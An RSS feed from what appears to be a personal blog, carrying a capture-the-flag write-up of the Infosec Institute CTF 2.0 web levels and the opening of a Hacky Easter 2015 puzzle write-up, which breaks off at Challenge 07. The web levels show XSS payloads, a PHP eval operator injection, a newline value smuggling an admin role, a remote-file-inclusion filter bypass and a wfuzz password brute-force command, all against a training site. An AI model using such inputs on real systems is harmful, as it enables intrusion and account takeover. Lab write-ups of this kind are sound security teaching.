<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on Unlogic</title>
    <link>http://unlogic.co.uk/tags/ctf/</link>
    <description>Recent content in Ctf on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 25 Jun 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://unlogic.co.uk/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Infosec Institute CTF2.0</title>
      <link>http://unlogic.co.uk/2015/06/25/infosec-institute-ctf2-dot-0/</link>
      <pubDate>Thu, 25 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/06/25/infosec-institute-ctf2-dot-0/</guid>
      <description>

&lt;p&gt;The folks over at the &lt;a href=&#34;https://infosecinstitute.com&#34;&gt;Infosec Institue&lt;/a&gt; have released
their &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/&#34;&gt;second CTF&lt;/a&gt;. Here&amp;rsquo;s how I got on&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;level-01:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 01&lt;/h1&gt;

&lt;p&gt;In &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php&#34;&gt;level 01&lt;/a&gt; I am supposed
to use the provided form to perform a cross site scripting exploit. Here&amp;rsquo;s what the form
looks like:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CJTNyK4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I might as well test how the form works. Entering something like &lt;code&gt;test&lt;/code&gt; and
&lt;code&gt;www.test.com&lt;/code&gt; in the fields simply adds the supplied information to the column on the left.
So I try the usual XSS payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Ex1&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt; in the &lt;code&gt;Site Name&lt;/code&gt; field.&lt;/p&gt;

&lt;p&gt;A popup tells me that I need to &lt;em&gt;match the requested format&lt;/em&gt;. Probably some client side
checks, so I inspect the field with Firebug and notice this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f5KzFDx.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The field has a regular expression premitting only upper or lowercase characters. I can either
delete this or just change it to &lt;code&gt;.+&lt;/code&gt; so it matches any character.&lt;/p&gt;

&lt;p&gt;Now resubmitting the XSS payload works and the string is reflected on the page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yvSc4To.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, there&amp;rsquo;s no pop up. So there must be something else validating input. Heading back to the
source I find some javscript in &lt;code&gt;ex1.js&lt;/code&gt; which contains the following code:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/VVe74tW.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VVe74tW.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;siteName&lt;/code&gt; variable has all &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters replaced with their equivalent html codes.
By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
my data. The Firebug debugger breaks on the line and I step over it. Sure enough &lt;code&gt;siteName&lt;/code&gt; is not
what I want it to be. Double clicking on the value in the right hand window allows me to edit it, and
revert it back to what I want it to be. Then clicking continue I am rewarded with:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VEFDpio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-02:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 02&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php&#34;&gt;Level 02&lt;/a&gt; is a simple web calculator:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/asgTWCw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I&amp;rsquo;m supposed to use the form to print &lt;code&gt;phpinfo&lt;/code&gt; or other data to the page. This is a PHP
script evaluating a simple expression. I am guessing that it&amp;rsquo;s going to be calling &lt;code&gt;eval&lt;/code&gt;, as
that&amp;rsquo;s a fairly common vulnerability, and fits to how the page works. After entering some numbers
and other characters into the two fields I quickly learn that the input for those fields is checked.
That means I can&amp;rsquo;t enter anything but numbers into those fields. That leaves the operator as the only
other thing under our control.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m going to guess that code looks somewhat like this:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;eval (&amp;quot;print $num1 $op $num2;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I need to change the operand to something that prints &lt;code&gt;phpinfo&lt;/code&gt; but leaves the rest of the statement
valid. With Firebug I can edit the value of the operand to the following:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8xnqMxv.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hit submit and&amp;hellip;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/rUgaixe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-03:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 03&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php&#34;&gt;Level 03&lt;/a&gt; provides me with a registration
form and a login form. The instructions indicate that the data is stored in a delimited file and I need
to sign up as a new user with admin rights.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f0g5TmV.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;First things first, let&amp;rsquo;s see if we can figure out the delimiter&amp;hellip; Signing up and logging in
shows us our name and current role: &lt;code&gt;role:normal&lt;/code&gt;. This already tells me that the delimiter is not
&lt;code&gt;:&lt;/code&gt;. After fuzzing the input it turns out most characters are ok to use. So what&amp;rsquo;s the delimeter?
I check the hints and it tells me that it&amp;rsquo;s the newline character. Interesting, in my fuzzing I tried that,
but had no luck. Unless..&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s not use &lt;code&gt;\n&lt;/code&gt; but a real new line. I can achieve this by editing the source with Firebug
once again, changing the &lt;code&gt;lastname&lt;/code&gt; field to a &lt;code&gt;textarea&lt;/code&gt; type:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QBVptMv.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QBVptMv.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now I can have multiple lines and enter a real carriage return into the field. My last
name will be&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;alpha7
role:admin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And after a login with the new creds:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Akj9NL8.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-04:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 04&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php&#34;&gt;Level 04&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/nmRe8U2.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nmRe8U2.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we need to load a php file instead of the text files that load when you click
on the &lt;em&gt;Bio&lt;/em&gt;, &lt;em&gt;Clients&lt;/em&gt;, or &lt;em&gt;About&lt;/em&gt; buttons. The instructions are very clear,
but it sounds like we need to load a phop file from the root of the domain. Let&amp;rsquo;s
see what restrictions are in place.&lt;/p&gt;

&lt;p&gt;Fuzzing the file parameter I notice that it seems to test for &lt;code&gt;fileNiXtxt&lt;/code&gt; where &lt;em&gt;N&lt;/em&gt; is
any number and &lt;code&gt;X&lt;/code&gt; is any other character. Anything other than that pattern will print &lt;code&gt;Invalid file selected.&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entering &lt;code&gt;index.php;file1.txt&lt;/code&gt; for example gives a different error: &lt;code&gt;There is something else that you must do.&lt;/code&gt;.
Interesting. So I guess it just needs to be somewhere in that argument for the filter to accept it. But
how can we accomplish this with a valid payload?&lt;/p&gt;

&lt;p&gt;One thing I tried was &lt;code&gt;/file1/txt/../../file.php&lt;/code&gt; which wasn&amp;rsquo;t right either. Here we make use
of relative paths where when PHP opens the file, it will ignore the fact that the path
&lt;code&gt;/file1/txt&lt;/code&gt; doesn&amp;rsquo;t exist and treat this as if &lt;code&gt;file.php&lt;/code&gt; as at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;UPDATE: Solved&lt;/p&gt;

&lt;p&gt;So the key bit I was missing was that it wanted a remote, even if that remote is the
same domain as the current page. So I added &lt;code&gt;http://infosecinstitute.com/file3.php&lt;/code&gt; as
the argument to get a new error: &lt;em&gt;You are trying to add a remote URL.&lt;/em&gt; Ok, now we are getting somewhere.
As one of the hints is that the regex might be case sensitive, let&amp;rsquo;s capitalise the &lt;code&gt;h&lt;/code&gt; in &lt;code&gt;http&lt;/code&gt;.
This time we get an &lt;em&gt;invalid file&lt;/em&gt; message, so that bypass worked. Now we need to satisfy the
&lt;code&gt;file3.txt&lt;/code&gt; requirement and using &lt;code&gt;Http://infosecinstitute.com/file3.txt.php&lt;/code&gt; I get the flag&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/WTFYtJi.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WTFYtJi.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-05:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 05&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php&#34;&gt;Level 05&lt;/a&gt; starts by telling
me that I am not logged in.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/BOBdkHX.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, I don&amp;rsquo;t remember logging in, so that&amp;rsquo;s not unusual. What is unusual is
that the &lt;code&gt;login&lt;/code&gt; button doesn&amp;rsquo;t work. I&amp;rsquo;ll quickly check the source code and notice
that it&amp;rsquo;s disabled, but also that it points to &lt;code&gt;login.html&lt;/code&gt;. Enabling and clicking it
takes me to a 404, so no go. The vulnerability here is &lt;em&gt;Missing Function Level Access Control&lt;/em&gt;
so perhaps this page assumes we&amp;rsquo;re logged in if we are coming from the login page. Let&amp;rsquo;s
assume that if the user is successful on &lt;code&gt;login.html&lt;/code&gt;, that page will redirect here, and then
this page will just assume that the user is allowed to be here.&lt;/p&gt;

&lt;p&gt;Using an intercepting proxy I&amp;rsquo;ll edit the &lt;code&gt;Referer&lt;/code&gt; field in the original request, so that
it appears to be coming from the login page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EK9u7Ir.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Forward the request and&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QCisDvN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-06:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 06&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex6.php&#34;&gt;Level 06&lt;/a&gt; shows a nice
big text area with allowable HTML tags.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Waq1AVN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time I need to perform a cross site request forgery. This can be accomlished by an &lt;code&gt;href&lt;/code&gt;
tag, but trying this tells me that they are expecting something that will perform the request
without the need for user interaction. Ok, fine, let&amp;rsquo;s revisit the allowed tags. &lt;code&gt;img&lt;/code&gt; looks useful, right?&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s try the following&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qCd5NUP.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yep, that&amp;rsquo;s what we needed.&lt;/p&gt;

&lt;h1 id=&#34;level-07:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 07&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php&#34;&gt;Level 07&lt;/a&gt; is a login form on which
we need to perform another XSS attack.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WO8dRpe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
the one you see there. Some investigation shows that the value of the hidden field comes from
a php_self value. That is it uses whatever the URL part is to populate the field, so that form
is submitted back to itself.&lt;/p&gt;

&lt;p&gt;Using this we can inject something into the field to hopefully reflect our data on the page.
By employing the &lt;code&gt;arg&lt;/code&gt; paramater we can close the &lt;code&gt;input&lt;/code&gt; tag, and the inject our &lt;code&gt;h1&lt;/code&gt; tags:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg=&amp;#39;&amp;gt;&amp;lt;h1&amp;gt;username&amp;lt;/h1&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Submitting that puts &lt;code&gt;username&lt;/code&gt; on the page surrounded by &lt;code&gt;h1&lt;/code&gt; tags and nabs the flag&lt;/p&gt;

&lt;h1 id=&#34;level-08:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 08&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php&#34;&gt;Level 08&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/610ZNNq.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we need to upload an image that will produce a javscript alert. First things first with these
things I upload an image to see how it behaves. Once uploaded I click on the example links and notice that
images are fetched via an id. The URL is&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So let me see if I can access an image via another ID, for example &lt;code&gt;id=4&lt;/code&gt;.
I get the message:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;This attachment is currently under review by our editors. 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So no. Checking out the image URL for one of the chess images shows me that the images
are stored at &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess1.png&lt;/code&gt; for example.&lt;/p&gt;

&lt;p&gt;I make a note of this.&lt;/p&gt;

&lt;p&gt;Now can I just upload an html file? That gives me an error of an invalid file type. So let me chack
if it&amp;rsquo;s just checking the extension or if there&amp;rsquo;s something more happening. Intercepting the upload
request with Burp proxy I can change the extension to &lt;code&gt;jpg&lt;/code&gt; and sucessfully upload the html file.&lt;/p&gt;

&lt;p&gt;Now browsing to the image url I am told it cannot display the image due to errors. Well, the browser
is trying to interpret the file as an image, which it clearly isn&amp;rsquo;t. There&amp;rsquo;s got to be another way
to get at my image. How about the object reference in the URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/code&gt;
for example? Maybe if I just reference the filename directly?&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=index.jpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Success&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/RVoJGMr.png&#34;&gt;{ %img http://i.imgur.com/RVoJGMr.png %}&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-09:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 09&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php&#34;&gt;Level 09&lt;/a&gt; starts off by showing me the
details of one John Doe.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8NESmpB.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I need to change something to make it show the details for Mary Jane. There&amp;rsquo;s no URL parms,
no login, so how can the page know who to show? There&amp;rsquo;s one place left: the cookie jar.&lt;/p&gt;

&lt;p&gt;Using Firebug once again I inspect the cookies and sure enough&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGdtDa7.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is &amp;ldquo;JOHN+DOE&amp;rdquo; encoded as base64 as it turns out. One thing to note is when you&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;echo Sk9ITitET0u= | base64 -d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;there is no newline at end of the name. So to encode &lt;code&gt;MARY+JANE&lt;/code&gt; correctly I need to
use echo with the &lt;code&gt;-n&lt;/code&gt; flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; -n MARY+JANE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64
TUFSWStKQU5F
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Editing the cookie and inserting that base64 string will show us Mary Jane&amp;rsquo;s details.&lt;/p&gt;

&lt;h1 id=&#34;level-10:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 10&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php&#34;&gt;Level 10&lt;/a&gt; is a game and we need to
edit its source so we look like we&amp;rsquo;re really good at it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/g03njlQ.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Entering anything in the name I field I have a poke around to see how the whole thing
works. We&amp;rsquo;re shown some coloured squares and then they are turn over. We need to then
remember which colour each square had. Except we need to do it at least 9999 times and
at the extreme level, which only shows us the squares for a second.&lt;/p&gt;

&lt;p&gt;Finding the square colours isn&amp;rsquo;t hard. With Firebug we can see:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/isDO7LM.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;and those numbers are 0 indexed into the list of numbers from the selction popup. So playing
along I can win one game. So let&amp;rsquo;s find out where my current win/loss count is stored.&lt;/p&gt;

&lt;p&gt;In the Javscript I find a structure that does this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/gZghIIn.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;but all this does is increment and decrement the values. Clearly that data is stored somewhere.
Turns out that this &lt;code&gt;localstorage&lt;/code&gt; is in the DOM. Using the &lt;em&gt;DOM&lt;/em&gt; tab in Firebug I can find
the structure and its data:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGIZXpb.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now I can edit the number of wins and then, all I need to do is play one more game to take the flag.&lt;/p&gt;

&lt;h1 id=&#34;level-11:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 11&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex11.php&#34;&gt;Level 11&lt;/a&gt; blacklists me&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/RaGy98O.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Awwwww I was having such fun. But how? Not from my IP, as that&amp;rsquo;s going to change. First thing
to check: cookie jar. Yay!&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QgGrvwE.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;There it is, a big &lt;code&gt;no&lt;/code&gt;. I&amp;rsquo;ll change that to a &lt;code&gt;yes&lt;/code&gt;, reload and take the flag, thanks very much.&lt;/p&gt;

&lt;h1 id=&#34;level-12:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 12&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&#34;&gt;Level 12&lt;/a&gt; is a bruteforce challange. No
login attempt limits, no rate limits, so it&amp;rsquo;s ripe for the picking.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/LMUBNoq.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;After searching for the suggested password list, the first hit is the Openwall password list for
john the ripper. So why not download it and give it a try?&lt;/p&gt;

&lt;p&gt;I fire up &lt;code&gt;wfuzz&lt;/code&gt; with the following commandline&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; wfuzz -c -z file,/usr/share/wordlists/password-2011.lst --hw Incorrect -d &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;username=admin&amp;amp;password=FUZZ&amp;amp;logIn=Login&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Within a few seconds I get a hit with &lt;code&gt;princess&lt;/code&gt;. Enter that with the username &lt;code&gt;admin&lt;/code&gt; and onto the next level&lt;/p&gt;

&lt;h1 id=&#34;level-13:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 13&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=ex13-task.php&#34;&gt;Level 13&lt;/a&gt; is actually
redirect to &lt;code&gt;ex13-task.php&lt;/code&gt;. I need to make the redirect point to an external page so that to another user
it looks like they are visiting &lt;code&gt;ctf.infosecinstitute.com&lt;/code&gt; but are infact taken to another site&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jNgQ4Ww.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Well the obvious thing is just to try and type in another URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk&lt;/code&gt;
but that gives me an error. Hrmm&amp;hellip; trying a few other redirect options tells me that the redirect is URL
relative, which means if I strip off the protocol off the URL, I should be able to make this work:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QM7V8Dk.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QM7V8Dk.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sure enough, that worked. That&amp;rsquo;s it, the final flag.&lt;/p&gt;

&lt;p&gt;Thanks to the Infosec Institute for another great CTF!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hacky Easter 2015</title>
      <link>http://unlogic.co.uk/2015/06/01/hacky-easter-2015/</link>
      <pubDate>Mon, 01 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/06/01/hacky-easter-2015/</guid>
      <description>

&lt;p&gt;Another year, another Hacky Easter and a month, of fun, learning, and
frustrations. All in all this was another great year and I&amp;rsquo;m already looking
forward to 2016&amp;rsquo;s edition. I found this year&amp;rsquo;s challenges were a bit harder than
last year, but I did my best.&lt;/p&gt;

&lt;h1 id=&#34;challenge-01:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 01&lt;/h1&gt;

&lt;p&gt;I&amp;rsquo;m told to search out the password in the following image&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/mIXj50g.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Taking note of the missing letters and rearranging them to spell &lt;code&gt;HACKERZ&lt;/code&gt; I&amp;rsquo;ll enter
that into the egg-o-matic and see what happens. Oh, hello there&amp;rsquo;e the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-02:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 02&lt;/h1&gt;

&lt;p&gt;The eggs is already there:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/98japcd.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;But it won&amp;rsquo;t scan in its current state, not with &lt;em&gt;NO&lt;/em&gt; written in the QR code.
First things first I looked at the page and image source. Turns out that this is
not an image, but a table instead. I examined the table with Firebug and noticed
that the elements of the &lt;em&gt;NO&lt;/em&gt; have different CSS tags. Looking up at the header I
saw that those tags were defined twice, causing the values to be overriden.&lt;/p&gt;

&lt;p&gt;I created a local copy, set the values to the initial values (so delete the second
definition) and then we get a valid QR code that will scan.&lt;/p&gt;

&lt;h1 id=&#34;challenge-03:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 03&lt;/h1&gt;

&lt;p&gt;Lego. I love Lego, and therefore already knew what an &lt;code&gt;ldx&lt;/code&gt; file is. So I opened
it in Lego Digital Designer and took a look at the bricks. Looks like quite a hard
code to crack. Although it seems a little odd that the bottom layer is 3 bricks deep.
I started picking away some of the first layer and there were white and black bricks
underneath. Potentially a QR code? Even using the &amp;ldquo;Select colour and shape&amp;rdquo; tool, removing
all the top layer bricks will take a little while, but we are then rewarded with a valid QR code.&lt;/p&gt;

&lt;h1 id=&#34;challenge-04:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 04&lt;/h1&gt;

&lt;p&gt;Mobile challenge. I get a list of numbers, or definitions of numbers,
and I have to arrange them in order. The easiest way to do this was to write them in a
file and then use the linux &lt;code&gt;sort&lt;/code&gt; command to order them accordingly. Once I had the
list it was just a matter of ordering them in the right order on the phone, and submitting them
to get the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-05:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 05&lt;/h1&gt;

&lt;p&gt;Another mobile challange. I get shown four bars, each one of which is controlled
by some phone sensor. The middle two were easy to discover. Just by moving the phone I could
see that the orientation and tilt controlled those. The top bar increased every 5 seconds. The
bottom bar however was a bit trickier. It took a day to discover this, because it actually
represents the time the phone has been charging since the app was run for the first time.&lt;/p&gt;

&lt;p&gt;I left it plugged in and waited until the bar was green, aligned the phone correctly and then
waited for the 5 second bar to fill up to collect my egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-06:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 06&lt;/h1&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;dah-dah-dit dit dah-dah-dah di-dah-dit dah-dah-dit dit dah-dah dah-di-dah-dit di-di-dah-dit di-dah-di-dit dah-di-dah-dah
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is clearly morse code. &lt;code&gt;dit&lt;/code&gt; and &lt;code&gt;di&lt;/code&gt; are dots and the &lt;code&gt;dah&lt;/code&gt; is dash. Decoded this to get
&lt;code&gt;georgemcfly&lt;/code&gt;. I entered this and was told I was 3 months too early! Only one thing for it:
change the system date to 3 months in the future. Resubmitted the password and was granted the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-07:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 07&lt;/h1&gt;

